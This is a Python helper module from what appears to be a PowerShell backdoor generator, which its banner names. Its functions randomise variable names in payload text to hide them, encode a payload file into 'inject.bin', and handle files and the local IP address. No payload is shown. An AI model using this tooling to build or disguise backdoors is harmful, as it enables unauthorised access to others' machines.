import re
import time
import socket
import random
import string
import hashlib
import subprocess
import socketserver
from threading import Thread
from http.server import SimpleHTTPRequestHandler

BLOCKSIZE = 65536
WINDOWS_LINE_ENDING = b'\r\n'
UNIX_LINE_ENDING = b'\n'

LOGO = """
     /| 
    / |ejm
   /__|______
  |  __  __  |
  | |  ||  | | 
  | |__||__| |== sh!
  |  __  __()|/      ...I'm not really here.
  | |  ||  | |       
  | |  ||  | |       [*] Use print_help to show all commands
  | |__||__| |       [*] https://github.com/Drew-Alleman/powershell-backdoor-generator
  |__________|

"""

def make_unix_here(content, new_path):
    """ Makes file content unix EOL 
    """
    content.replace(WINDOWS_LINE_ENDING, UNIX_LINE_ENDING)
    with open(new_path, 'wb') as f:
        f.write(content)
    return True


format_string = lambda string: string.decode().strip("\n") if type(string) == bytes else string.strip()

generate_string = lambda string_size: ''.join(random.choice(string.ascii_letters) for i in range(string_size))

def save_content_to_file(content: str, filename: str) -> bool:
    """ Saves content to a local file
    :param content: Bytes to save to file 
    :param filename: Filename to save data to
    """
    if "Cannot find path '" in format_string(content):
        return False
    with open(filename, "w") as f:
        f.seek(0)
        f.write(content)
    return True

def get_output(command: list) -> str:
    """ returns the stdout of a cmd command
    :param command: commad to run
    :return: stdout 
    """
    print("[*] Encoding payload.txt -> inject.bin")
    proc = subprocess.Popen(command, stdout=subprocess.PIPE,  stderr=subprocess.PIPE, shell=True)
    proc.wait()
    stdout, stderr = proc.communicate()
    if not stderr:
        print("[*] Encoded payload.txt -> inject.bin")
    else:
        print(f"[*] Ran into an error: {stderr} when encoding 'payload.txt' ")    
    return stdout

def obfuscate(original: str, old: str, size: int = None) -> str:
    """ Obfuscate's a specific variable from text to a random string
    :param original: Original text to modify
    :param old: Old text to replace
    :return: Modified string
    """
    size = random.randint(5, 24)
    new = generate_string(size)
    return  re.sub(old, new, original)

def get_sha1_file_hash(filename: str) -> str:
    """ Creates a hash based on the file content
    :param filename: Filename to read
    :return: A sha1 hash 
    """
    hasher = hashlib.sha1()
    with open(filename, 'rb') as f:
        buf = f.read(BLOCKSIZE)
        while len(buf) > 0:
            hasher.update(buf)
            buf = f.read(BLOCKSIZE)
    return hasher.hexdigest()

def get_file_content(filename: str) -> str:
    """ Gets a files content
    :param filename: Filename to read
    :return: File content as a string
    """
    with open(filename, "r") as f:
        content: str = f.read()
    return content

def get_ip_address():
    """ Fetches the users active local IP Address
    :return: IP Address as a string
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    ipaddress = sock.getsockname()[0]
    sock.close()
    return ipaddress
